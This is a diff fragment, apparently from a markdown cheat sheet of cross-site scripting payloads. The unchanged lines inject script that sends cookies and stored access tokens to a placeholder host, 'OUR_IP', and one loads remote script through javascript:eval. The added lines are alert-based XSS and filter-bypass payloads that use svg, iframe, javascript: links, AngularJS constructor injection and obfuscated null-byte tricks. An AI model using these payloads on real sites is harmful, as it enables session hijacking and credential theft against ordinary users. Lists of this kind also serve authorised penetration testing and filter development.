@@ -19,6 +19,12 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 <script>document.location='http://OUR_IP/index.php?c='+localStorage.getItem('access_token')</script>
 <script>new Image().src="http://OUR_IP/index.php?c="+document.cookie;</script>
 <script>new Image().src="http://OUR_IP/index.php?c="+localStorage.getItem('access_token');</script>
+'"><svg><animate onbegin=alert('hacked') attributeName=x></svg> 
+<a href=javascript:alert('hacked')>Click Here</a>
+<IFRAME SRC="javascript:alert('hacked');"></IFRAME>
+<div ng-app> <strong class="ng-init:constructor.constructor('alert('hacked')')()">aaa</strong> </div>
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`hacked` //
+'<00 foo="<a%20href="iavascript :alert("XSS-Bypass')">XSS-CLick</00>--%20/
 ```
 {% endcode %}
 
